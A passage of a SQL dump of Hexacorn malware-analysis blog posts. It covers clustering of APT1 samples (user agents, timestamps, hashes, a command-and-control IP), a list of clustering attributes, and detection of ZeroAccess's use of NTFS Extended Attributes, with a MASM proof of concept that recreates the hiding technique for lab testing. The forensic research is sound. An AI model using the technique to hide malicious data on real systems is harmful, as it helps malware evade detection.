[HOSTNAME]\\[USERNAME]\n5.1 07:43 [HOSTNAME]\\[USERNAME]\n5.1 09:35 [HOSTNAME]\\[USERNAME]\n5.1 09:36 [HOSTNAME]\\[USERNAME]\n5.1 09:38 [HOSTNAME]\\[USERNAME]\n5.1 09:39 [HOSTNAME]\\[USERNAME]\nGoogle+page\nHTTP 1.1\nHTTP Mozilla/5.0(compatible+MSIE\nIPHONE8.5(host:[HOSTNAME],ip:[IP]\nIPHONE8.5(host:[HOSTNAME],ip:[IP]ct:Sun Feb 24 08:46:20 2013\nIPHONE8.5(host:[HOSTNAME],ip:[IP]ct:Sun Feb 24 08:46:40 2013\nInternet SurfBear\nMicrosoft Internet Explorer 6.0\nMicrosoft Internet Explorer Exelon [HOSTNAME]\nMozilla/4.0 (compatible;\nMozilla/4.0 (compatible; MSIE 6.0; Win32\nMozilla/4.0 (compatible; MSIE 6.0; Win32–[HOSTNAME]\nMozilla/4.0 (compatible; MSIE 6.0; Win32;\nMozilla/4.0 (compatible; MSIE 6.0; Win32;Ali;\nMozilla/4.0 (compatible; MSIE 6.0; Win32;Fly;\nMozilla/4.0 (compatible; MSIE 6.0; Win32;Google;\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; EmbeddedWB 14.52 from\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727\nMozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1\nMozilla/4.0 (compatible; MSIE 8.0; Win32\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Cxdp.BMWCN\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Cxdp.BMWUS\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Cxdp.NSF\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.004:48\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.008:36\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.008:37\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.008:47\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.008:48\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.009:07\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.009:13\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.009:27\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.009:50\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; [HOSTNAME];Trident/4.010:19\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0\nMozilla/4.0 (compatible; MSIE7.0; Windows NT 5.1\nMozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0\nMozilla/4.0\nMozilla/5.0 (compatible; MSIE 7.1; Windows NT 5.1; SV1\nMozilla/5.0 (compatible; MSIE 8.0; Win32\nMozilla/5.0\nWin32\n[HOSTNAME]+Mozilla/4.0 (compatible; MSIE 8.0; Win32\n[HOSTNAME]\nyahoo html\n\nDelays in ms\n\n100\n1000\n2000\n3000\n4000\n5000\n6000\n10000\n30000\n60000\n100000\n120000\n127000\n300000\n600000\n900000\n1500000\n1620000\n174000\n1740000\n1800000\n2100000\n\nCompilation timestamps:\n\n2001-07-17 00:22:56 Tuesday 995329376\n2003-08-06 18:34:23 Wednesday 1060194863\n2003-10-16 03:41:02 Thursday 1066275662\n2004-01-23 23:39:42 Friday 1074901182\n2004-05-15 01:06:23 Saturday 1084583183\n2004-07-07 02:17:12 Wednesday 1089166632\n2004-08-04 06:02:53 Wednesday 1091599373\n2004-08-04 06:10:04 Wednesday 1091599804\n2004-08-04 06:14:22 Wednesday 1091600062\n2004-08-04 06:14:38 Wednesday 1091600078\n2004-08-04 07:56:01 Wednesday 1091606161\n2004-08-04 07:56:07 Wednesday 1091606167\n2004-08-04 07:56:21 Wednesday 1091606181\n2004-08-04 07:56:23 Wednesday 1091606183\n2004-08-04 07:56:26 Wednesday 1091606186\n2004-08-04 07:56:30 Wednesday 1091606190\n2004-08-04 07:56:36 Wednesday 1091606196\n2004-08-04 07:56:37 Wednesday 1091606197\n2004-08-04 07:56:39 Wednesday 1091606199\n2004-08-04 07:56:40 Wednesday 1091606200\n2004-08-04 07:56:42 Wednesday 1091606202\n2004-08-04 07:56:44 Wednesday 1091606204\n2004-08-04 07:56:58 Wednesday 1091606218\n2004-08-04 07:57:08 Wednesday 1091606228\n2004-08-04 07:57:38 Wednesday 1091606258\n2004-08-04 07:59:14 Wednesday 1091606354\n2006-08-03 12:45:02 Thursday 1154609102\n2006-09-13 18:20:18 Wednesday 1158171618\n2006-09-14 02:28:46 Thursday 1158200926\n2007-06-29 15:18:22 Friday 1183130302\n2007-07-25 17:44:33 Wednesday 1185385473\n2007-08-08 03:16:50 Wednesday 1186543010\n2007-09-17 09:21:03 Monday 1190020863\n2007-11-18 23:50:13 Sunday 1195429813\n2008-03-12 12:39:30 Wednesday 1205325570\n2008-04-13 19:14:55 Sunday 1208114095\n2008-06-17 01:20:04 Tuesday 1213665604\n2008-07-30 03:25:13 Wednesday 1217388313\n2008-08-22 00:43:16 Friday 1219365796\n2008-08-27 08:41:19 Wednesday 1219826479\n2008-09-16 08:40:03 Tuesday 1221554403\n2008-09-16 08:42:05 Tuesday 1221554525\n2008-09-16 09:20:31 Tuesday 1221556831\n2008-10-22 00:12:21 Wednesday 1224634341\n2008-10-27 02:18:16 Monday 1225073896\n2008-10-27 08:31:43 Monday 1225096303\n2008-10-27 13:48:37 Monday 1225115317\n2008-11-10 08:29:48 Monday 1226305788\n2008-11-10 08:30:00 Monday 1226305800\n2008-11-21 07:46:32 Friday 1227253592\n2009-01-07 08:09:33 Wednesday 1231315773\n2009-01-15 03:30:11 Thursday 1231990211\n2009-02-05 07:14:01 Thursday 1233818041\n2009-02-05 07:16:28 Thursday 1233818188\n2009-02-05 07:20:22 Thursday 1233818422\n2009-02-17 09:40:38 Tuesday 1234863638\n2009-03-02 09:52:20 Monday 1235987540\n2009-03-06 14:10:18 Friday 1236348618\n2009-03-16 13:30:51 Monday 1237210251\n2009-03-17 03:34:24 Tuesday 1237260864\n2009-03-17 13:21:25 Tuesday 1237296085\n2009-03-25 13:11:56 Wednesday 1237986716\n2009-04-12 09:14:38 Sunday 1239527678\n2009-05-14 17:12:40 Thursday 1242321160\n2009-05-26 07:37:57 Tuesday 1243323477\n2009-06-08 10:17:38 Monday 1244456258\n2009-07-08 13:30:46 Wednesday 1247059846\n2009-07-16 15:04:29 Thursday 1247756669\n2009-07-20 08:33:01 Monday 1248078781\n2009-07-20 09:02:46 Monday 1248080566\n2009-07-25 03:44:04 Saturday 1248493444\n2009-07-29 14:34:24 Wednesday 1248878064\n2009-07-30 09:20:04 Thursday 1248945604\n2009-08-03 08:29:29 Monday 1249288169\n2009-08-11 08:38:40 Tuesday 1249979920\n2009-08-16 11:05:43 Sunday 1250420743\n2009-08-24 13:16:23 Monday 1251119783\n2009-08-28 02:17:30 Friday 1251425850\n2009-11-11 06:33:02 Wednesday 1257921182\n2009-11-17 22:13:19 Tuesday 1258495999\n2009-12-01 00:40:09 Tuesday 1259628009\n2009-12-21 01:39:02 Monday 1261359542\n2010-01-15 17:20:56 Friday 1263576056\n2010-02-03 08:22:33 Wednesday 1265185353\n2010-02-03 08:22:50 Wednesday 1265185370\n2010-02-09 08:29:43 Tuesday 1265704183\n2010-02-11 03:27:04 Thursday 1265858824\n2010-02-11 06:44:46 Thursday 1265870686\n2010-02-25 00:49:53 Thursday 1267058993\n2010-03-15 06:27:58 Monday 1268634478\n2010-04-12 09:09:29 Monday 1271063369\n2010-04-14 17:18:20 Wednesday 1271265500\n2010-04-20 03:39:27 Tuesday 1271734767\n2010-04-23 07:51:28 Friday 1272009088\n2010-05-20 07:01:21 Thursday 1274338881\n2010-06-23 01:24:31 Wednesday 1277256271\n2010-06-25 09:26:47 Friday 1277458007\n2010-06-29 00:31:41 Tuesday 1277771501\n2010-08-23 02:17:20 Monday 1282529840\n2010-09-19 08:34:11 Sunday 1284885251\n2010-09-27 02:06:31 Monday 1285553191\n2010-09-28 01:00:25 Tuesday 1285635625\n2010-09-28 08:09:41 Tuesday 1285661381\n2010-10-19 08:15:54 Tuesday 1287476154\n2010-10-21 06:51:09 Thursday 1287643869\n2010-10-29 06:50:40 Friday 1288335040\n2010-10-29 06:51:08 Friday 1288335068\n2010-11-02 08:35:56 Tuesday 1288686956\n2010-11-04 06:07:11 Thursday 1288850831\n2010-11-06 08:08:37 Saturday 1289030917\n2010-11-17 13:37:00 Wednesday 1290001020\n2010-11-18 01:54:57 Thursday 1290045297\n2010-12-02 08:05:26 Thursday 1291277126\n2010-12-16 03:14:07 Thursday 1292469247\n2010-12-16 03:16:48 Thursday 1292469408\n2010-12-18 08:10:11 Saturday 1292659811\n2010-12-22 08:02:25 Wednesday 1293004945\n2011-01-11 02:12:48 Tuesday 1294711968\n2011-01-11 02:24:30 Tuesday 1294712670\n2011-01-11 03:22:02 Tuesday 1294716122\n2011-03-02 07:40:24 Wednesday 1299051624\n2011-03-03 13:41:14 Thursday 1299159674\n2011-03-07 09:42:59 Monday 1299490979\n2011-03-08 02:36:50 Tuesday 1299551810\n2011-03-16 19:26:23 Wednesday 1300303583\n2011-03-22 12:59:55 Tuesday 1300798795\n2011-03-23 14:34:10 Wednesday 1300890850\n2011-03-23 14:36:19 Wednesday 1300890979\n2011-03-28 13:35:35 Monday 1301319335\n2011-03-29 08:40:16 Tuesday 1301388016\n2011-04-02 09:07:51 Saturday 1301735271\n2011-04-08 08:04:50 Friday 1302249890\n2011-04-20 13:13:08 Wednesday 1303305188\n2011-04-21 07:16:51 Thursday 1303370211\n2011-04-21 07:51:21 Thursday 1303372281\n2011-04-26 01:53:58 Tuesday 1303782838\n2011-04-28 01:22:03 Thursday 1303953723\n2011-05-17 07:45:35 Tuesday 1305618335\n2011-05-17 12:37:22 Tuesday 1305635842\n2011-05-20 01:14:53 Friday 1305854093\n2011-05-30 08:29:29 Monday 1306744169\n2011-06-28 22:39:19 Tuesday 1309300759\n2011-07-11 03:38:22 Monday 1310355502\n2011-07-18 03:10:56 Monday 1310958656\n2011-07-19 01:55:13 Tuesday 1311040513\n2011-07-28 04:50:57 Thursday 1311828657\n2011-07-28 14:49:46 Thursday 1311864586\n2011-07-29 07:10:31 Friday 1311923431\n2011-08-09 08:15:29 Tuesday 1312877729\n2011-08-11 13:15:49 Thursday 1313068549\n2011-08-19 02:34:16 Friday 1313721256\n2011-08-19 03:07:37 Friday 1313723257\n2011-09-20 03:40:51 Tuesday 1316490051\n2011-09-20 03:50:48 Tuesday 1316490648\n2011-09-25 13:42:51 Sunday 1316958171\n2011-09-25 13:43:28 Sunday 1316958208\n2011-09-27 13:07:55 Tuesday 1317128875\n2011-09-27 13:09:16 Tuesday 1317128956\n2011-10-10 14:16:57 Monday 1318256217\n2011-10-11 13:02:38 Tuesday 1318338158\n2011-10-12 01:58:10 Wednesday 1318384690\n2011-10-13 08:47:13 Thursday 1318495633\n2011-10-14 08:42:16 Friday 1318581736\n2011-10-14 11:58:04 Friday 1318593484\n2011-10-18 00:58:17 Tuesday 1318899497\n2011-10-19 09:16:10 Wednesday 1319015770\n2011-10-19 09:17:10 Wednesday 1319015830\n2011-10-19 09:19:09 Wednesday 1319015949\n2011-10-24 08:19:05 Monday 1319444345\n2011-11-01 02:43:26 Tuesday 1320115406\n2011-11-05 09:27:34 Saturday 1320485254\n2011-11-07 14:59:20 Monday 1320677960\n2011-11-17 07:22:44 Thursday 1321514564\n2011-11-21 12:36:14 Monday 1321878974\n2011-11-21 12:36:51 Monday 1321879011\n2011-11-22 01:15:22 Tuesday 1321924522\n2011-11-28 12:32:07 Monday 1322483527\n2011-12-12 03:28:15 Monday 1323660495\n2011-12-20 02:23:38 Tuesday 1324347818\n2012-01-19 00:50:11 Thursday 1326934211\n2012-01-20 03:14:28 Friday 1327029268\n2012-02-09 00:47:28 Thursday 1328748448\n2012-02-09 00:47:52 Thursday 1328748472\n2012-02-16 08:22:06 Thursday 1329380526\n2012-02-17 14:55:21 Friday 1329490521\n2012-02-23 07:20:31 Thursday 1329981631\n2012-02-28 11:48:43 Tuesday 1330429723\n2012-02-28 15:35:51 Tuesday 1330443351\n2012-03-02 06:27:21 Friday 1330669641\n2012-03-02 07:20:27 Friday 1330672827\n2012-03-02 08:45:11 Friday 1330677911\n2012-03-07 08:41:30 Wednesday 1331109690\n2012-03-12 01:34:56 Monday 1331516096\n2012-03-13 02:21:54 Tuesday 1331605314\n2012-03-13 03:47:57 Tuesday 1331610477\n2012-03-16 07:10:50 Friday 1331881850\n2012-03-20 09:24:33 Tuesday 1332235473\n2012-03-22 08:45:38 Thursday 1332405938\n2012-03-28 15:39:00 Wednesday 1332949140\n2012-04-12 15:02:26 Thursday 1334242946\n2012-04-17 08:29:00 Tuesday 1334651340\n2012-04-17 08:30:01 Tuesday 1334651401\n2012-04-17 09:32:54 Tuesday 1334655174\n2012-04-24 08:24:45 Tuesday 1335255885\n2012-05-07 03:19:17 Monday 1336360757\n2012-05-14 14:16:53 Monday 1337005013\n2012-05-28 08:12:40 Monday 1338192760\n2012-05-29 14:39:47 Tuesday 1338302387\n2012-06-04 12:57:35 Monday 1338814655\n2012-06-09 13:19:49 Saturday 1339247989\n2012-06-09 13:19:53 Saturday 1339247993\n2012-06-11 12:37:20 Monday 1339418240\n2012-06-26 03:30:05 Tuesday 1340681405\n2012-08-08 23:27:53 Wednesday 1344468473\n2012-08-10 02:10:53 Friday 1344564653\n2012-08-16 07:53:11 Thursday 1345103591\n2012-08-20 12:56:12 Monday 1345467372\n2012-08-20 12:59:08 Monday 1345467548\n2012-08-20 14:06:56 Monday 1345471616\n2012-08-20 15:16:12 Monday 1345475772\n2012-08-21 13:46:15 Tuesday 1345556775\n2012-08-22 15:50:16 Wednesday 1345650616\n2012-08-28 07:34:32 Tuesday 1346139272\n2012-08-28 13:40:13 Tuesday 1346161213\n2012-08-30 13:06:09 Thursday 1346331969\n2012-09-06 15:34:30 Thursday 1346945670\n2012-09-10 14:25:34 Monday 1347287134\n2012-11-07 14:12:48 Wednesday 1352297568\n2012-11-13 14:55:39 Tuesday 1352818539\n2012-11-14 07:58:27 Wednesday 1352879907\n2012-11-16 07:35:22 Friday 1353051322\n2012-12-06 13:09:40 Thursday 1354799380\n2012-12-25 13:07:50 Tuesday 1356440870\n\n \nThe sampleset – clustering\nQuite frankly, there is not so much to write about it here.\nI do not find obvious distribution or significant spikes of specific patterns and the results are not very presentable – to provide a few specific examples – out of 285 samples:\nThe following samples use DES:\n\n0CF9E999C574EC89595263446978DC9F\n24259AE8B0018B0CE9992FB1D9B69E2A\n468FF2C12CFFC7E5B2FE0EE6BB3B239E\n476FEA8761A03BEF16E322996C2F6666\n7AECB34616245EB6B2906358151BE55B\n7F1A4BC267ACE340A5AA7A0B79CBF349\n8E8622C393D7E832D39E620EAD5D3B49\n929802A27737CEBC59D19DA724FDF30A\nC04C796EF126AD7429BE7D55720FE392\nCF9C2D5A8FBDD1C5ADC20CFC5E663C21\nD0D5A20C5A6C4FDDAB4D43B85632B6A9\nD34E357461C55D90C52309C1FF952B4C\nDD21D1EA2146861A4219B1CBDAEFE59B\n\nThe following files run runinfo.exe:\n\n09531F851EF74A7238685FD287A395BD\n0CA6E2AD69826C8E3287FC8576112814\nC3E5603A38E700274D1AB30CE93D08B9\n\nThe following samples use mutex !@ADS@#$\n\n6B3D19CC86D82B06F5DB3AE9D5BA8A5F\n831A67DC75E2D4505180888747BC8EA9\n\nThe following samples connect to 69.28.168.10:443\n\n1F2EB7B090018D975E6D9B40868C94CA\nD9FBF759F527AF373E34673DC3ACA462\n\nThe conclusion?\nDiplomatically speaking – my clustering efforts are far from being actionable at this stage :-).\nSandboxing samples provides a good data for toying around, but w/o some normalization of this data and w/o ability to establish links between smaller clusters, it’s hard to draw any significant conclusion.\nSad, but watch this space \nShare this :)', 'Batch Analysis, Compromise Detection, Malware Analysis', 'http://www.hexacorn.com/blog/2013/03/04/clustering-and-batch-analysis-of-apt1-sampleset1/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (323, 'Permanent Link to Clustering and Batch Analysis', 'Hexacorn', 'March 4, 2013 ', 'I have recently been toying around with clustering of various malicious sample sets – running files through a sandbox and static analysis tools, and then applying various normalization and histograms to the output. The results are not mind-blowing, but encouraging. They help in grouping various malware families into separate buckets, improve log parsing routines, and in some cases can be also leveraged to quickly discover hidden properties of the malware e.g. encryption keys, User Agents, HTTP verbs, etc. etc. – these may be then  used for more in-depth analysis of proxy logs, etc.\nHere is a short list of ‘clusterable’ attributes just in case you want to design your own clustering solution and are looking for a quick cheat list; it is certainly far from being complete, but may give you some pointers:\nSTATIC\n\nFile Name\nFile Extension\nFile Size\nFile Type\n\nThis will have a lot of ‘subtypes’ – for MZ files see details here and here\nFor executable – sequence of bytes at the entry point, and at the real entry point (for main, wmain, DLLMain, as well as for VB, Delphi code)\nFor PE file – for each of these: their names where applicable, sizes, flags, entropy, strings:\n\nsections (for list of known sections see here)\nimport tables\nexport tables\n\n\n\n\nFor PE file –\n\nPE type\nImage base\nCompilation/debug time stamps\nResources – number, topology\nDebug strings\n\n\n\n\nFile Entropy\nCompiler (PEiD, etc.)\nPacker, protector \nFile hashes (MD5, SHA1, CTPH, …)\nExtracted strings\nPresence and characteristics of appended  data (e.g. installers)\nSequences of code\n\nDisassembled code\nDecompiled code\nSelected code (e.g. map of calls)\n\n\nDetection by various AVs\nMultimedia properties (e.g. width, height, EXIF data, etc.)\n\nDYNAMIC\n\nAccessed IPs\nAccessed URLs\nGET and POST Queries\nUser Agents\nPorts used\nCreated/accessed Mutexes/mutants\nCreated/accessed Atoms\nCreated/accessed Window names\nCreated/accessed Window classes\nCreated/accessed Windows topology\nWindows’ visibility\nWindows’ Unicodeness\nWindows’ topology\nWindows’ titles\nWindows’ classes\nCrypto used + built-in or API-based\nPopular strings used (e.g. copyright banners as seen here)\nExecution paths (code, sequences, code blocks, API sequences)\nUse of location-independent code\nUse of escalation of privileges tricks\nUse and type of code injection\nUse of kernel drivers (including system DLLs)\nUse of stolen certificates\nUse of anti-* techniques\nUse of 0days\nUse of timestomping\nUse of dynamically vbuilt strings (run-time)\nUse of code to adjust privileges)\nUse of keylogging techniques (and what type: hook, API hook, etc.)\nUse of external tools (e.g. cmd.exe, reg.exe, net.exe)\nUse of autoruns.inf\nUse of DKOM\nUse of code directly accessing physical drives\nUse of code directly accessing physical memory\nUse of code directly accessing BIOS\nUse of hypervisor\nMBR – code modification\nMBR – partition table modification\nPasswords used for encryption and to access (e.g. FTP/SMTP/IRC)\nDropped file locations, names\nSearched path locations, registry names\nTargeted applications (e.g. browser, mail, IM and P2P clients, etc.)\nAdded/modified registry entries\nAPIs executed and their arguments\n\nType of APIs (kernel32 win32 APIs or ntdll Zw/NT APIs)\nDelays used in waiting functions\nAPIs/techniques used for memory allocation (heap, virtual*, stack-based, etc.)\nAPIs/techniques used for self-deletion\nAPIs/techniques used for running other .exes\nAPIs/techniques used for network (winsock or wininet/also Rtl functions from ntdll)\nAPIs/techniques used for network enumeration (Net*, WNet*, Domain*)\nProcess enumeration APis\n…\n\n\n\nLet me interrupt you here…\nOkay, okay, I get i!!! It is a never ending list!!!\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/03/04/clustering-and-batch-analysis/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (324, 'Permanent Link to HMFT 0.3 + Extended Attributes, short update', 'Hexacorn', 'February 17, 2013 ', 'update\nfixed the title of the post  – it’s obviously a version 0.3 and not 3.0 \nold post\nIn my last post I talked about detecting Extended Attributes (used by ZeroAccess malware) using HMFT.  Today I got a chance to update it a bit with some more information.\nFirst of all, I clustered some of the ZeroAccess samples I had and I came up with a list of comprehensive (of course it’s limited by a sampleset I have) file locations and their Extended Attributes that are used by the malware:\n\n%SYSTEMROOT%\\system32\\services.exe::731\n%USERPROFILE%\\appdata\\local\\a4ca9b9c\\u::@@@ \n%USERPROFILE%\\AppData\\Local\\{0c9c4ca4-c3a9-47cf-2e3e-4db8bf2ad457}\\U::001\n%SYSTEMROOT%\\$NtUninstallKB16214$\\2764741532\\U::CFG\n\nYou can find a full list of samples using EAs together with hashes (md5_sha1) here.\nSecondly, I added some code to HMFT and now it can dump Extended Attribute’s name (and some printable content of the EA value) as well:\n   RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 224\r\n      LengthOfAttributeD       = 40\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 0\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 4\r\n      --\r\n      SizeOfContentD          = 16\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_EA\r\n            OfsNextEAD      = 16\r\n            FlagsB          = 0\r\n            EaNameLenB      = 3\r\n            EaValueLenW     = 3\r\n            EaName = FOO\r\n            EaValue= bar\nUsing newer version of HMFT on one of the ZeroAccess samples gives the following result after postprocessing with eads.pl script:\n\nAfter HMFT update, eads.pl had to be slightly modified::\nuse strict;\r\nmy $f=\'\';\r\nmy $l=\'\';\r\nwhile (<>)\r\n{\r\n  s/[\\r\\n]+//g;\r\n  $f = $1 if /FileName = (.+)$/;\r\n  print \"$f has $1 record\\n\" if ($l =~ /(MFTA_EA(_[A-Z]+)?)/);\r\n  print \"$f:\".\":$1\\n\" if (/EaName = (.+)$/);\r\n  print \"$f:$1\\n\" if ($l =~ /MFTA_DATA/&&/AttributeName = (.+)$/);\r\n  $l = $_;\r\n}\nBtw. if you look at the screenshot above you will notice :SummaryInformation ADS used by this sample (5D23ACF4C2221B687BC96A2701786C13/ AB7EEC68F9438E31523D0A67E7612CA666C8F56A) as well – it can be even better seen in the window of Process Monitor during the malware installation:\n\nIn terms of APIs used by ZeroAccess to create EAs, I finally came across a few samples that use ZwSetEaFile to do so,. Interestingly. none of the samples used this API to create EA for services.exe – all the samples using this API create the following EA:\n\n%USERPROFILE%\\appdata\\local\\a4ca9b9c\\u::@@@\n\n(Please refer to the older post for more information about the context of this discussion.)\nYou can download latest hmft here.\n \nShare this :)', 'Anti-Forensics, Compromise Detection, Forensic Analysis, HMFT, Malware Analysis', 'http://www.hexacorn.com/blog/2013/02/17/hmft-3-0-extended-attributes-short-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (325, 'Permanent Link to Detecting Extended Attributes (ZeroAccess) and other Frankenstein’s Monsters with ', 'Hexacorn', 'January 25, 2013 ', 'The topic of Extended Attributes (EA) has been recently covered in an excellent post by Corey. Entitled Extracting ZeroAccess from NTFS Extended Attributes it goes into (amazing) depth explaining on what EA is and how to extract this artifact from the system. It’s a pure forensic gold and if you haven’t read this post yet, please go ahead and do so before reading mine.\nSimilarly to Corey, I was very interested in researching EA, and I finally took some time tonight to have a deeper look at it myself. I actually wanted to dig in the code more than the $MFT artifacts alone not only to have something to write about (after all, Corey already covered everything! :-)), but also because I wanted to see how the EA is actually created and what system functions/APIs are used by malware. The reason behind this curiosity was improvement of my analysis tools and techniques, and a few other ideas that I will be quiet about for the moment.\nI first assumed that the ZeroAccess’ EAs are created using ZwSetEaFile/NtSetEaFile function from ntdll.dll. I saw this API name popping up on some blogs and I saw it being referenced in my ZeroAccess memory/file dumps so it was a natural ‘breakpoint’ choice for OllyDbg analysis:\n\nTo my surprise, none of the samples I checked used this function at all!\nCurious, I started digging into it a bit more and realized that for the samples I looked at, the EAs are actually created not by  ZwSetEaFile/NtSetEaFile function, but by ZwCreateFile/NtCreateFile.\nSurprised?\nI was!\nLooking at a documentation, you can see the following function parameters described on MSDN:\nNTSTATUS NtCreateFile(\r\n  _Out_     PHANDLE FileHandle,\r\n  _In_      ACCESS_MASK DesiredAccess,\r\n  _In_      POBJECT_ATTRIBUTES ObjectAttributes,\r\n  _Out_     PIO_STATUS_BLOCK IoStatusBlock,\r\n  _In_opt_  PLARGE_INTEGER AllocationSize,\r\n  _In_      ULONG FileAttributes,\r\n  _In_      ULONG ShareAccess,\r\n  _In_      ULONG CreateDisposition,\r\n  _In_      ULONG CreateOptions,\r\n  _In_      PVOID EaBuffer,\r\n  _In_      ULONG EaLength\r\n);\nYes, it’s that simple.\nOne thing to note – the EA is added to files on both windows XP and Windows 7, but only under Windows 7 I observed the modification of services.exe. On Windows XP, it only appended EA to the  ‘U’ file and nothing else.\nOkay, I mentioned I had a couple of ideas why I wanted to research this feature. Now it’s time to reveal them!\nIdea #1 – POC\nOnce I found out what APIs are being used by the malware, I was also able to produce a simple snippet of code that reproduces the functionality:\n.586\r\n.MODEL FLAT,STDCALL\r\n\r\n o equ OFFSET\r\n include    windows.inc\r\n include    kernel32.inc\r\n includelib kernel32.lib\r\n include    ntdll.inc\r\n includelib ntdll.lib\r\n include    masm32.inc\r\n includelib masm32.lib\r\n\r\nIO_STATUS_BLOCK STRUCT\r\n    union\r\n    Status        dd ?\r\n    Pointer        dd ?\r\n    ends\r\n    Information    dd ?\r\nIO_STATUS_BLOCK ENDS\r\n\r\n.data?\r\n file db 256 dup (?)\r\n fa   db 256 dup (?)\r\n _FILE_FULL_EA_INFORMATION struct\r\n   NextEntryOffset dd ?\r\n   Flags           db ?\r\n   EaNameLength    db ?\r\n   EaValueLength   dw ?\r\n   EaName          db ?\r\n _FILE_FULL_EA_INFORMATION ends\r\n FEA equ _FILE_FULL_EA_INFORMATION\r\n io IO_STATUS_BLOCK <>\r\n.code\r\n  Start:\r\n  invoke GetCL,1, o file\r\n  lea    edi,[fa+_FILE_FULL_EA_INFORMATION.EaName]\r\n  invoke GetCL,2, edi\r\n  invoke lstrlenA,edi\r\n  lea    esi,[fa+_FILE_FULL_EA_INFORMATION.EaNameLength]\r\n  mov    [esi],al\r\n  add    edi,eax\r\n  inc    edi\r\n  invoke GetCL,3, edi\r\n  invoke lstrlenA,edi\r\n  lea    esi,[fa+_FILE_FULL_EA_INFORMATION.EaValueLength]\r\n  mov    [esi],al\r\n  add    edi,eax\r\n  invoke CreateFileA, o file, \\\r\n                      GENERIC_WRITE, \\\r\n                      0, \\\r\n                      NULL, \\\r\n                      CREATE_NEW, \\\r\n                      FILE_ATTRIBUTE_NORMAL, \\\r\n                      NULL\r\n  xchg   eax,ebx\r\n  mov    eax,edi\r\n  sub    eax,o fa\r\n  invoke NtSetEaFile,ebx,o io,o fa, eax\r\n  invoke CloseHandle,ebx\r\n  invoke ExitProcess,0\r\nEND Start\nThis code can be used for testing purposes in a lab environment.\nYou can either compile the code yourself using masm32 or you can use a precompiled binary – download it here.\nTo run:\nea.exe <full path name to a file> <EA name> <EA value>\ne.g.:\nea.exe g:\\test.txt foo bar\nRemember to specify a full path to a file. Also, choose a non-existing file name for a file (the program won’t work with files that are already present).\nLast, but not least – there is no error checks, you can add it yourself if you wish \nIdea #2 – Reduce the FUD factor\nWhile it is a novelty technique, it is not very advanced –  a single API call does all the dirty job to _create_ the EA.\nTo _detect_ EA is not very difficult either – as long as you have a right tool to do so \nIdea #3 – Show how to detect EA on a live system\nNow that I got a POC, I can run it:\ng:\\test.txt foo bar\nand then analyze changes introduced to the file system.\nI can do it quickly  with hmft.\nhmft -l g: mft_list\nI tested the program on a small drive that I use for my tests. I formatted it first to ensure its MFT is clean:\n\nI then opened the mft_list file in a Total Commander’s Lister and searched for MFTA_EA. \nI am pasting the full record for your reference:\n  [FILE]\r\n    SignatureD                    = 1162627398\r\n    OffsetToFixupArrayW           = 48\r\n    NumberOfEntriesInFixupArrayW  = 3\r\n    LogFileSequenceNumberQ        = 1062946\r\n    SequenceValueW                = 1\r\n    LinkCountW                    = 1\r\n    OffsetToFirstAttributeW       = 56\r\n    FlagsW                        = 1\r\n    UsedSizeOfMFTEntryD           = 368\r\n    AllocatedSizeOfMFTEntryD      = 1024\r\n    FileReferenceToBaseRecordQ    = 0\r\n    NextAttributeIdD              = 5\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 16\r\n      LengthOfAttributeD       = 96\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            